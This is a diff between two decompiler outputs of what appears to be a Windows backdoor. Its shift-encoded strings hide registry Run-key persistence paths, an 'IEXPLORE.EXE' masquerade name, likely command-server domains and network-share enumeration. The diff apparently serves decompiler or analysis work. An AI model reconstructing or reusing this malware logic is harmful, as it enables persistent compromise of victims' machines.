@@ -407,71 +407,83 @@ int32_t g6 = 0; // edx
 int32_t g7 = 0; // esi
 int32_t g8 = 0; // esp
 int32_t g9 = 0x35ff006a;
-int32_t g10 = 0x706f754f;
-char * g11 = "\x4c\x6e\x6b\x63\x6e\x5d\x69\x1c\x42\x65\x68\x61\x6f";
-struct _SECURITY_ATTRIBUTES * g12 = (struct _SECURITY_ATTRIBUTES *)0x706a4558;
-char g13[2] = "\\";
-bool g14 = true;
-int32_t g15 = 41;
-int32_t g16 = 40;
-char g17[2] = ".";
-char * g18 = "\x93\x93\x93\x49\x6c\xc0\xde\xd1\xe0\x93\x93\x93\x93\x8b\x94\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x9b\xb3\x93\x9f\x6c\x93\x49\x93\x97\x82\x99\x93\x93\x93\x93\x93\x93\x93\xc4\x93\x93\x93\x93\x93\x47\x93\x93\x13\x0c\x93\xdd\xc7\xdf\xde\xc0\xc0\xc3\x93\x90\x93\x93\x93\x92\x93\x92\x93\xd5\x93\x93\x93\x93\x93\x93\x93\xd4\x93\x93\x93\x93\x93\x93\x93\xd3\x93\x93\x93\x93\x93\x93\x93\xd3\x93\x93\x93\x95\x93\x95\x93\xd3\x93\x93\x93\x83\x93\x83\x93\xd4\x93\x93\x93\x86\x19\x1b\x73\xdb\x93\xdc\x93\xd7\x93\x93\x12\x8a\xf9\xe9\x61\x77\xda\x8f\xbb\x3c\xa3\xb6\xe7\x83\xf4\xc0\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa1\x93\xa2\x93\xaa\x93\xa6\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa6\x93\xbd\x93\xa3\x93\x93\x93\x93\x93";
-char * g19 = "\x93\x93\x93\x37\x6c\xc0\xde\xd1\xe0\x93\x93\x93\x93\x8b\x94\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x93\x83\x93\x9f\x6c\x93\x37\x93\x97\x82\x99\x93\x93\x93\x93\x93\x93\x93\xb3\x93\x93\x93\x93\x93\x47\x93\x93\x13\xfa\x93\xdd\xc7\xdf\xde\xc0\xc0\xc3\x93\x92\x93\x93\x93\x04\x11\x9b\x73\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa1\x93\xa2\x93\xaa\x93\xa6\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa6\x93\xbd\x93\xa3\x93\x93\x93\x93\x93";
-char * g20 = "\x93\x93\x93\x16\x6c\xc0\xde\xd1\xe1\x93\x93\x93\x93\x8b\xc0\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x93\x93\x93\x93\xf1\x93\x91\xc3\xd0\xb3\xdd\xd6\xc7\xc4\xdc\xc1\xd8\xb3\xc3\xc1\xdc\xd4\xc1\xd2\xde\xb3\xa2\xbd\xa3\x93\x91\xdf\xd2\xdd\xde\xd2\xdd\xa2\xbd\xa3\x93\x91\xc4\xfa\xfd\xf7\xfc\xe4\xe0\xb3\xf5\xfc\xe1\xb3\xc4\xfc\xe1\xf8\xf4\xe1\xfc\xe6\xe3\xe0\xb3\xa0\xbd\xa2\xf2\x93\x91\xdf\xde\xa2\xbd\xa1\xcb\xa3\xa3\xa1\x93\x91\xdf\xd2\xdd\xde\xd2\xdd\xa1\xbd\xa2\x93\x91\xdd\xc7\xb3\xdf\xde\xb3\xa3\xbd\xa2\xa1\x93";
-char * g21;
-int32_t g22 = 0;
-int32_t g23 = 0;
-int32_t g24 = 0;
-char * g25;
-int32_t g26 = 0;
+void (**g10)() = NULL;
+void (**g11)() = NULL;
+void (**g12)() = NULL;
+void (**g13)() = NULL;
+int32_t g14 = 0x706f754f;
+char * g15 = "\x4c\x6e\x6b\x63\x6e\x5d\x69\x1c\x42\x65\x68\x61\x6f";
+struct _SECURITY_ATTRIBUTES * g16 = (struct _SECURITY_ATTRIBUTES *)0x706a4558;
+char g17[2] = "\\";
+bool g18 = true;
+int32_t g19 = 41;
+int32_t g20 = 40;
+char g21[2] = ".";
+char * g22 = "\x93\x93\x93\x49\x6c\xc0\xde\xd1\xe0\x93\x93\x93\x93\x8b\x94\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x9b\xb3\x93\x9f\x6c\x93\x49\x93\x97\x82\x99\x93\x93\x93\x93\x93\x93\x93\xc4\x93\x93\x93\x93\x93\x47\x93\x93\x13\x0c\x93\xdd\xc7\xdf\xde\xc0\xc0\xc3\x93\x90\x93\x93\x93\x92\x93\x92\x93\xd5\x93\x93\x93\x93\x93\x93\x93\xd4\x93\x93\x93\x93\x93\x93\x93\xd3\x93\x93\x93\x93\x93\x93\x93\xd3\x93\x93\x93\x95\x93\x95\x93\xd3\x93\x93\x93\x83\x93\x83\x93\xd4\x93\x93\x93\x86\x19\x1b\x73\xdb\x93\xdc\x93\xd7\x93\x93\x12\x8a\xf9\xe9\x61\x77\xda\x8f\xbb\x3c\xa3\xb6\xe7\x83\xf4\xc0\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa1\x93\xa2\x93\xaa\x93\xa6\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa6\x93\xbd\x93\xa3\x93\x93\x93\x93\x93";
+char * g23 = "\x93\x93\x93\x37\x6c\xc0\xde\xd1\xe0\x93\x93\x93\x93\x8b\x94\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x93\x83\x93\x9f\x6c\x93\x37\x93\x97\x82\x99\x93\x93\x93\x93\x93\x93\x93\xb3\x93\x93\x93\x93\x93\x47\x93\x93\x13\xfa\x93\xdd\xc7\xdf\xde\xc0\xc0\xc3\x93\x92\x93\x93\x93\x04\x11\x9b\x73\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa1\x93\xa2\x93\xaa\x93\xa6\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa6\x93\xbd\x93\xa3\x93\x93\x93\x93\x93";
+char * g24 = "\x93\x93\x93\x16\x6c\xc0\xde\xd1\xe1\x93\x93\x93\x93\x8b\xc0\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x93\x93\x93\x93\xf1\x93\x91\xc3\xd0\xb3\xdd\xd6\xc7\xc4\xdc\xc1\xd8\xb3\xc3\xc1\xdc\xd4\xc1\xd2\xde\xb3\xa2\xbd\xa3\x93\x91\xdf\xd2\xdd\xde\xd2\xdd\xa2\xbd\xa3\x93\x91\xc4\xfa\xfd\xf7\xfc\xe4\xe0\xb3\xf5\xfc\xe1\xb3\xc4\xfc\xe1\xf8\xf4\xe1\xfc\xe6\xe3\xe0\xb3\xa0\xbd\xa2\xf2\x93\x91\xdf\xde\xa2\xbd\xa1\xcb\xa3\xa3\xa1\x93\x91\xdf\xd2\xdd\xde\xd2\xdd\xa1\xbd\xa2\x93\x91\xdd\xc7\xb3\xdf\xde\xb3\xa3\xbd\xa2\xa1\x93";
+int32_t g25 = 1;
+char * g26;
 int32_t g27 = 0;
 int32_t g28 = 0;
-struct _WIN32_FIND_DATAA * g29 = NULL;
-struct _WIN32_FIND_DATAA * g30 = NULL;
-char g31 = 0;
-char g32 = 0;
-struct _NETRESOURCEA * g33 = NULL;
-int32_t g34 = 0;
-int32_t g35 = 0;
-char * g36;
-char * g37;
-int32_t g38 = 0;
-struct _SECURITY_ATTRIBUTES * g39 = NULL;
+int32_t g29 = 0;
+char * g30;
+int32_t g31 = 0;
+int32_t g32 = 0;
+int32_t g33 = 0;
+struct _WIN32_FIND_DATAA * g34 = NULL;
+struct _WIN32_FIND_DATAA * g35 = NULL;
+char g36 = 0;
+char g37 = 0;
+struct _NETRESOURCEA * g38 = NULL;
+int32_t g39 = 0;
 int32_t g40 = 0;
-int32_t g41 = 0;
-int32_t g42 = 0;
+char * g41;
+char * g42;
 int32_t g43 = 0;
-int32_t g44 = 0;
-struct _SECURITY_ATTRIBUTES * g45 = NULL;
+struct _SECURITY_ATTRIBUTES * g44 = NULL;
+int32_t g45 = 0;
 int32_t g46 = 0;
-struct _SECURITY_ATTRIBUTES * g47 = NULL;
+int32_t g47 = 0;
 int32_t g48 = 0;
-char * g49;
+int32_t g49 = 0;
 struct _SECURITY_ATTRIBUTES * g50 = NULL;
-char * g51;
-char * g52;
+int32_t g51 = 0;
+struct _SECURITY_ATTRIBUTES * g52 = NULL;
 int32_t g53 = 0;
-int32_t g54 = 0;
-int32_t g55 = 0;
-int32_t g56 = 0;
-int32_t g57 = 0;
+char * g54;
+struct _SECURITY_ATTRIBUTES * g55 = NULL;
+char * g56;
+char * g57;
 int32_t g58 = 0;
 int32_t g59 = 0;
-char * g60;
-int16_t g61 = 0;
-char * g62;
-char g63 = 0;
-int16_t g64 = 0;
-int32_t g65 = 0;
-int32_t g66 = 0;
+int32_t g60 = 0;
+int32_t g61 = 0;
+int32_t g62 = 0;
+int32_t g63 = 0;
+int32_t g64 = 0;
+char * g65;
+int16_t g66 = 0;
 char * g67;
-char * g68;
-char g69 = 0;
-char * g70;
+char g68 = 0;
+int16_t g69 = 0;
+int32_t g70 = 0;
 int32_t g71 = 0;
-int32_t g72 = 0;
-int32_t g73 = 0;
-char * g74;
+char * g72;
+char * g73;
+char g74 = 0;
+char * g75;
+int32_t g76 = 0;
+int32_t g77 = 0;
+int32_t g78 = 0;
+char * g79;
+int32_t g80 = 0;
+int32_t g81 = 0;
+int32_t g82 = 0;
+int32_t g83 = 0;
+int32_t g84 = 0;
+int32_t g85 = 0;
+char * g86;
 
 // ------------------------ Functions -------------------------
 
@@ -482,15 +494,21 @@ int32_t function_401000(int32_t a1) {
     *(int32_t *)(g2 - 4) = 0;
     int32_t v1 = g5; // bp-16
     *(int32_t *)(g2 - 16) = (int32_t)&v1;
+    int32_t result;
     if (function_40106c(v1, g7, g3, g4) != 0) {
         // 0x401023
         function_402508();
         WSACleanup();
+        result = 0;
+        // branch -> 0x401030
+    } else {
+        // 0x40101e
+        result = 1;
         // branch -> 0x401030
     }
     // 0x401030
-    abort();
-    // UNREACHABLE
+    __writefsdword(0, *(int32_t *)(g2 - 12));
+    return result;
 }
 
 // Address range: 0x401041 - 0x401047
@@ -598,9 +616,9 @@ int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
     function_401059("Xjapor_*ata");
     function_401059("Xjapo_r*ata");
     function_401059("Xjapor_o*ata");
-    function_401059((char *)&g10);
-    function_401059((char *)&g11);
-    function_401059((char *)&g12);
+    function_401059((char *)&g14);
+    function_401059((char *)&g15);
+    function_401059((char *)&g16);
     function_401059("bkn_acqaop");
     function_401047((char *)g2);
     function_401047((char *)str2);
@@ -614,44 +632,44 @@ int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
     function_401059("X`neranoX");
     function_401059("X@neranJqi*`]p");
     v1 = (struct _SECURITY_ATTRIBUTES *)"sss*bhua]chao*_ki";
-    strcpy((char *)&g52, "sss*bhua]chao*_ki");
-    strcpy((char *)&g51, "sss*gi)ju_*_ki");
-    strcpy((char *)&g50, "EATLHKNA*ATA");
-    strcpy((char *)&g49, (char *)str);
-    strcat((char *)&g49, "+`evde*ceb");
-    strcpy((char *)&g48, (char *)str);
-    lpThreadId = (struct _SECURITY_ATTRIBUTES *)&g48;
-    strcat((char *)&g48, "+_kjja_p*ceb");
-    strcpy((char *)&g47, (char *)str);
-    v1 = (struct _SECURITY_ATTRIBUTES *)&g47;
-    strcat((char *)&g47, "+ran*dpi");
+    strcpy((char *)&g57, "sss*bhua]chao*_ki");
+    strcpy((char *)&g56, "sss*gi)ju_*_ki");
+    strcpy((char *)&g55, "EATLHKNA*ATA");
+    strcpy((char *)&g54, (char *)str);
+    strcat((char *)&g54, "+`evde*ceb");
+    strcpy((char *)&g53, (char *)str);
+    lpThreadId = (struct _SECURITY_ATTRIBUTES *)&g53;
+    strcat((char *)&g53, "+_kjja_p*ceb");
+    strcpy((char *)&g52, (char *)str);
+    v1 = (struct _SECURITY_ATTRIBUTES *)&g52;
+    strcat((char *)&g52, "+ran*dpi");
+    strcpy((char *)&g51, (char *)str);
+    strcat((char *)&g51, "+ata*dpi");
     strcpy((char *)&g46, (char *)str);
-    strcat((char *)&g46, "+ata*dpi");
-    strcpy((char *)&g41, (char *)str);
-    strcat((char *)&g41, "+OkiaQlRan*dpi");
-    strcpy((char *)&g40, (char *)str);
-    lpThreadId = (struct _SECURITY_ATTRIBUTES *)&g40;
-    strcat((char *)&g40, "+OkiaQlHeop*dpi");
+    strcat((char *)&g46, "+OkiaQlRan*dpi");
     strcpy((char *)&g45, (char *)str);
-    v1 = (struct _SECURITY_ATTRIBUTES *)&g45;
-    strcat((char *)&g45, "+]ll*dpi");
-    strcpy((char *)&g44, (char *)str);
-    strcat((char *)&g44, "+iu]ll*dpi");
-    strcpy((char *)&g43, (char *)str);
-    strcat((char *)&g43, "+dkopheop*dpi");
-    strcpy((char *)&g42, (char *)str);
-    lpThreadId = (struct _SECURITY_ATTRIBUTES *)&g42;
-    strcat((char *)&g42, (char *)str2);
+    lpThreadId = (struct _SECURITY_ATTRIBUTES *)&g45;
+    strcat((char *)&g45, "+OkiaQlHeop*dpi");
+    strcpy((char *)&g50, (char *)str);
+    v1 = (struct _SECURITY_ATTRIBUTES *)&g50;
+    strcat((char *)&g50, "+]ll*dpi");
+    strcpy((char *)&g49, (char *)str);
+    strcat((char *)&g49, "+iu]ll*dpi");
+    strcpy((char *)&g48, (char *)str);
+    strcat((char *)&g48, "+dkopheop*dpi");
+    strcpy((char *)&g47, (char *)str);
+    lpThreadId = (struct _SECURITY_ATTRIBUTES *)&g47;
+    strcat((char *)&g47, (char *)str2);
     g5 = 0;
     int32_t v3 = g5; // 0x40136b
     struct _SECURITY_ATTRIBUTES * lpEventAttributes = (struct _SECURITY_ATTRIBUTES *)v3; // 0x40136d
     lpThreadId = lpEventAttributes;
-    g24 = (int32_t)CreateEventA(NULL, false, false, (char *)g2);
+    g29 = (int32_t)CreateEventA(NULL, false, false, (char *)g2);
     int32_t v4 = g5; // 0x401376
     struct _SECURITY_ATTRIBUTES * lpEventAttributes2 = (struct _SECURITY_ATTRIBUTES *)v4; // 0x401378
     v1 = lpEventAttributes2;
-    g23 = (int32_t)CreateEventA(lpEventAttributes, (v3 & 1) != 0, (v3 & 1) != 0, "Ie_nkokbpD]raAtep");
-    g22 = (int32_t)CreateEventA(lpEventAttributes2, (v4 & 1) != 0, (v4 & 1) != 0, (char *)lpName);
+    g28 = (int32_t)CreateEventA(lpEventAttributes, (v3 & 1) != 0, (v3 & 1) != 0, "Ie_nkokbpD]raAtep");
+    g27 = (int32_t)CreateEventA(lpEventAttributes2, (v4 & 1) != 0, (v4 & 1) != 0, (char *)lpName);
     if (function_401435() == 0) {
         // 0x40106c
         // branch -> 0x4013ee
@@ -662,8 +680,8 @@ int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
         return 0;
     }
     // 0x40138e
-    function_4018c1((struct _OSVERSIONINFOA *)&g65);
-    g62 = (char *)(int32_t)(function_4018ff() != 0);
+    function_4018c1((struct _OSVERSIONINFOA *)&g70);
+    g67 = (char *)(int32_t)(function_4018ff() != 0);
     function_401454(g5);
     function_4016a4();
     function_402859();
@@ -671,10 +689,10 @@ int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
     function_4022eb();
     function_4023c2();
     int32_t mem = (int32_t)malloc(0x2000); // 0x4013d3
-    g34 = mem;
+    g39 = mem;
     if (mem != g5) {
         int32_t * mem2 = malloc(0x2000); // 0x4013e2
-        g33 = (struct _NETRESOURCEA *)mem2;
+        g38 = (struct _NETRESOURCEA *)mem2;
         if ((int32_t)mem2 != g5) {
             // 0x4013f2
             function_4015ab();
@@ -715,7 +733,7 @@ int32_t function_401454(int32_t a1) {
     int32_t lpcbData = 128; // bp-12
     int32_t v1 = 0; // esi
     int32_t phkResult; // bp-8
-    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Okbps]naXIe_nkokbpX?qnnajpJapEjb", 0, (char *)&g74, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
+    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Okbps]naXIe_nkokbpX?qnnajpJapEjb", 0, (char *)&g79, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
     int32_t v2 = &lpcbData; // 0x40148d
     int32_t lpData; // bp-140
     int32_t v3 = &lpData; // 0x401491
@@ -755,7 +773,7 @@ int32_t function_401454(int32_t a1) {
         // 0x4014d3
         GetModuleFileNameA((int32_t *)hModule, (char *)&lpFilename, 512);
         str = (int32_t)strrchr((char *)&lpFilename, 92) + 1;
-        strcpy((char *)&g37, (char *)str);
+        strcpy((char *)&g42, (char *)str);
         v16 = *(char *)str;
         v17 = hModule;
         int32_t v23 = v17;
@@ -804,7 +822,7 @@ int32_t function_401454(int32_t a1) {
         lpValueName = "pid";
         // branch -> 0x40154e
         // 0x40154e
-        v6 = &g38;
+        v6 = &g43;
         v15 = g8;
         *(int32_t *)(v15 - 4) = v2;
         *(int32_t *)(v15 - 8) = v6;
@@ -827,7 +845,7 @@ int32_t function_401454(int32_t a1) {
             *(int32_t *)(v8 - 12) = 4;
             *(int32_t *)(v8 - 16) = hModule;
             *(int32_t *)(v8 - 20) = v1;
-            g38 = v7;
+            g43 = v7;
             *(int32_t *)(v8 - 24) = phkResult;
             v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
             v10 = v11;
@@ -856,14 +874,14 @@ int32_t function_401454(int32_t a1) {
     int32_t v32;
     if ((char)v27 == (char)hModule) {
         // 0x4014c8
-        *(char *)(v28 + (int32_t)&g37) = (char)v29;
+        *(char *)(v28 + (int32_t)&g42) = (char)v29;
         if (v29 != a1) {
             // 0x4014c8
             // branch -> 0x4014d3
             // 0x4014d3
             GetModuleFileNameA((int32_t *)hModule, (char *)&lpFilename, 512);
             str = (int32_t)strrchr((char *)&lpFilename, 92) + 1;
-            strcpy((char *)&g37, (char *)str);
+            strcpy((char *)&g42, (char *)str);
             v16 = *(char *)str;
             v17 = hModule;
             if (v16 != (char)v17) {
@@ -896,7 +914,7 @@ int32_t function_401454(int32_t a1) {
                     lpValueName = "pid";
                     // branch -> 0x40154e
                     // 0x40154e
-                    v6 = &g38;
+                    v6 = &g43;
                     v15 = g8;
                     *(int32_t *)(v15 - 4) = v2;
                     *(int32_t *)(v15 - 8) = v6;
@@ -919,7 +937,7 @@ int32_t function_401454(int32_t a1) {
                         *(int32_t *)(v8 - 12) = 4;
                         *(int32_t *)(v8 - 16) = hModule;
                         *(int32_t *)(v8 - 20) = v1;
-                        g38 = v7;
+                        g43 = v7;
                         *(int32_t *)(v8 - 24) = phkResult;
                         v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
                         v10 = v11;
@@ -960,7 +978,7 @@ int32_t function_401454(int32_t a1) {
             lpValueName = v30;
         }
         // 0x40154e
-        v6 = &g38;
+        v6 = &g43;
         v15 = g8;
         *(int32_t *)(v15 - 4) = v2;
         *(int32_t *)(v15 - 8) = v6;
@@ -983,7 +1001,7 @@ int32_t function_401454(int32_t a1) {
             *(int32_t *)(v8 - 12) = 4;
             *(int32_t *)(v8 - 16) = hModule;
             *(int32_t *)(v8 - 20) = v1;
-            g38 = v7;
+            g43 = v7;
             *(int32_t *)(v8 - 24) = phkResult;
             v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
             v10 = v11;
@@ -1006,7 +1024,7 @@ int32_t function_401454(int32_t a1) {
     }
     int32_t v33 = v27 & 255 | v4 & -256; // 0x4014b6
     unsigned char v34 = (char)v33 - 1; // 0x4014b6
-    *(char *)(v28 + (int32_t)&g37) = v34;
+    *(char *)(v28 + (int32_t)&g42) = v34;
     int32_t v35 = v1; // 0x4014be
     unsigned char v36 = *(char *)(g2 - 135 + v35); // 0x4014be
     int32_t v37 = v35 + 1; // 0x4014c5
@@ -1016,7 +1034,7 @@ int32_t function_401454(int32_t a1) {
         // 0x4014b6
         v33 = ((int32_t)v34 | v33 & -256) & -256 | (int32_t)v36;
         v34 = (char)v33 - 1;
-        *(char *)(v37 + (int32_t)&g37) = v34;
+        *(char *)(v37 + (int32_t)&g42) = v34;
         v35 = v37;
         v36 = *(char *)(g2 - 135 + v35);
         v37 = v35 + 1;
@@ -1025,7 +1043,7 @@ int32_t function_401454(int32_t a1) {
         // continue -> 0x4014b6
     }
     // 0x4014c8
-    *(char *)(v37 + (int32_t)&g37) = (char)v29;
+    *(char *)(v37 + (int32_t)&g42) = (char)v29;
     lpcbData2 = v32;
     lpType = v31;
     lpValueName = v30;
@@ -1035,7 +1053,7 @@ int32_t function_401454(int32_t a1) {
         // 0x4014d3
         GetModuleFileNameA((int32_t *)hModule, (char *)&lpFilename, 512);
         str = (int32_t)strrchr((char *)&lpFilename, 92) + 1;
-        strcpy((char *)&g37, (char *)str);
+        strcpy((char *)&g42, (char *)str);
         v16 = *(char *)str;
         v17 = hModule;
         if (v16 != (char)v17) {
@@ -1068,7 +1086,7 @@ int32_t function_401454(int32_t a1) {
                 lpValueName = "pid";
                 // branch -> 0x40154e
                 // 0x40154e
-                v6 = &g38;
+                v6 = &g43;
                 v15 = g8;
                 *(int32_t *)(v15 - 4) = v2;
                 *(int32_t *)(v15 - 8) = v6;
@@ -1091,7 +1109,7 @@ int32_t function_401454(int32_t a1) {
                     *(int32_t *)(v8 - 12) = 4;
                     *(int32_t *)(v8 - 16) = hModule;
                     *(int32_t *)(v8 - 20) = v1;
-                    g38 = v7;
+                    g43 = v7;
                     *(int32_t *)(v8 - 24) = phkResult;
                     v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
                     v10 = v11;
@@ -1128,7 +1146,7 @@ int32_t function_401454(int32_t a1) {
         // branch -> 0x40154e
     }
     // 0x40154e
-    v6 = &g38;
+    v6 = &g43;
     v15 = g8;
     *(int32_t *)(v15 - 4) = v2;
     *(int32_t *)(v15 - 8) = v6;
@@ -1151,7 +1169,7 @@ int32_t function_401454(int32_t a1) {
         *(int32_t *)(v8 - 12) = 4;
         *(int32_t *)(v8 - 16) = hModule;
         *(int32_t *)(v8 - 20) = v1;
-        g38 = v7;
+        g43 = v7;
         *(int32_t *)(v8 - 24) = phkResult;
         v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
         v10 = v11;
@@ -1185,13 +1203,13 @@ int32_t function_4015d4(char * lpValueName, int32_t a2) {
     int32_t lpBuffer = 0; // bp-520
     GetWindowsDirectoryA((char *)&lpBuffer, 512);
     int32_t str = 0; // bp-517
-    strcpy((char *)&str, (char *)&g11);
-    strcat((char *)&lpBuffer, (char *)&g12);
-    strcat((char *)&lpBuffer, g13);
-    strcat((char *)&lpBuffer, (char *)&g50);
+    strcpy((char *)&str, (char *)&g15);
+    strcat((char *)&lpBuffer, (char *)&g16);
+    strcat((char *)&lpBuffer, g17);
+    strcat((char *)&lpBuffer, (char *)&g55);
     int32_t Reserved = 0; // esi
     int32_t phkResult = 0; // bp-8
-    RegCreateKeyExA(HKEY_CURRENT_USER, "Okbps]naXIe_nkokbpXSej`ksoX?qnnajpRanoekjXLkhe_eaoXAtlhknanXNqj", 0, (char *)&g74, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
+    RegCreateKeyExA(HKEY_CURRENT_USER, "Okbps]naXIe_nkokbpXSej`ksoX?qnnajpRanoekjXLkhe_eaoXAtlhknanXNqj", 0, (char *)&g79, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
     char * hKey2; // bp-576
     int32_t v1;
     if (a2 != 1) {
@@ -1203,7 +1221,7 @@ int32_t function_4015d4(char * lpValueName, int32_t a2) {
         int32_t len = strlen((char *)&lpBuffer); // 0x401668
         g4 = &lpBuffer;
         hKey2 = (char *)&lpBuffer;
-        int32_t lpValueName2 = *(int32_t *)&lpValueName; // 0x4016796
+        int32_t lpValueName2 = *(int32_t *)&lpValueName; // 0x4016797
         int32_t v2 = RegSetValueExA((int32_t *)phkResult, (char *)lpValueName2, Reserved, 1, (char *)&lpBuffer, len); // 0x40167f
         v1 = v2;
         // branch -> 0x401693
@@ -1244,13 +1262,13 @@ int32_t function_4016a4(void) {
     if ((int32_t)hObject != lpMutexAttributes) {
         // 0x4016d5
         CloseHandle(hObject);
-        g5 = (int32_t)&g37;
-        int32_t v8 = lstrcmpiA((char *)&g37, "EATLHKNA*ATA"); // 0x4016e8
+        g5 = (int32_t)&g42;
+        int32_t v8 = lstrcmpiA((char *)&g42, "EATLHKNA*ATA"); // 0x4016e8
         lpName = v5;
         if (v8 == 0) {
             // 0x4016f2
-            dwMilliseconds = (struct _SECURITY_ATTRIBUTES *)&g50;
-            if (lstrcmpiA((char *)&g50, "EATLHKNA*ATA") != 0) {
+            dwMilliseconds = (struct _SECURITY_ATTRIBUTES *)&g55;
+            if (lstrcmpiA((char *)&g55, "EATLHKNA*ATA") != 0) {
                 // 0x401706
                 ExitProcess(1);
                 // UNREACHABLE
@@ -1258,10 +1276,10 @@ int32_t function_4016a4(void) {
             lpName = (struct _SECURITY_ATTRIBUTES *)"EATLHKNA*ATA";
         }
         // 0x40170e
-        *(int32_t *)(g8 - 4) = g24;
+        *(int32_t *)(g8 - 4) = g29;
         SetEvent(&dwMilliseconds2->e0);
         *(int32_t *)(g8 - 4) = 0x1388;
-        *(int32_t *)(g8 - 8) = g23;
+        *(int32_t *)(g8 - 8) = g28;
         WaitForSingleObject(&dwMilliseconds2->e0, (int32_t)dwMilliseconds);
         *(int32_t *)(g8 - 4) = 500;
         Sleep((int32_t)dwMilliseconds2);
@@ -1269,13 +1287,13 @@ int32_t function_4016a4(void) {
         *(int32_t *)(g8 - 4) = 512;
         *(int32_t *)(g8 - 8) = v7;
         GetWindowsDirectoryA((char *)dwMilliseconds2, (int32_t)dwMilliseconds);
-        *(int32_t *)(g8 - 4) = (int32_t)&g11;
+        *(int32_t *)(g8 - 4) = (int32_t)&g15;
         *(int32_t *)(g8 - 8) = (int32_t)&v3;
         strcpy((char *)dwMilliseconds2, (char *)dwMilliseconds);
-        *(int32_t *)(g8 - 4) = (int32_t)&g12;
+        *(int32_t *)(g8 - 4) = (int32_t)&g16;
         *(int32_t *)(g8 - 8) = v7;
         strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
-        *(int32_t *)(g8 - 4) = (int32_t)&g13;
+        *(int32_t *)(g8 - 4) = (int32_t)&g17;
         *(int32_t *)(g8 - 8) = v7;
         strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
         *(int32_t *)(g8 - 4) = g5;
@@ -1314,7 +1332,7 @@ int32_t function_4016a4(void) {
     *(int32_t *)(g8 - 4) = 512;
     *(int32_t *)(g8 - 8) = v7;
     GetWindowsDirectoryA((char *)dwMilliseconds2, (int32_t)dwMilliseconds);
-    *(int32_t *)(g8 - 4) = (int32_t)&g11;
+    *(int32_t *)(g8 - 4) = (int32_t)&g15;
     *(int32_t *)(g8 - 8) = (int32_t)&v3;
     strcpy((char *)dwMilliseconds2, (char *)dwMilliseconds);
     int32_t * v9 = (int32_t *)(g8 + 4); // 0x4017fd
@@ -1322,15 +1340,15 @@ int32_t function_4016a4(void) {
     *v9 = g3;
     *(int32_t *)g8 = v7;
     CreateDirectoryA((char *)dwMilliseconds2, dwMilliseconds);
-    *(int32_t *)(g8 - 4) = (int32_t)&g12;
+    *(int32_t *)(g8 - 4) = (int32_t)&g16;
     *(int32_t *)(g8 - 8) = v7;
     strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
     *(int32_t *)(g8 - 4) = v7;
     function_401414();
-    *(int32_t *)(g8 - 4) = (int32_t)&g13;
+    *(int32_t *)(g8 - 4) = (int32_t)&g17;
     *(int32_t *)(g8 - 8) = v7;
     strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
-    *(int32_t *)(g8 - 4) = (int32_t)&g50;
+    *(int32_t *)(g8 - 4) = (int32_t)&g55;
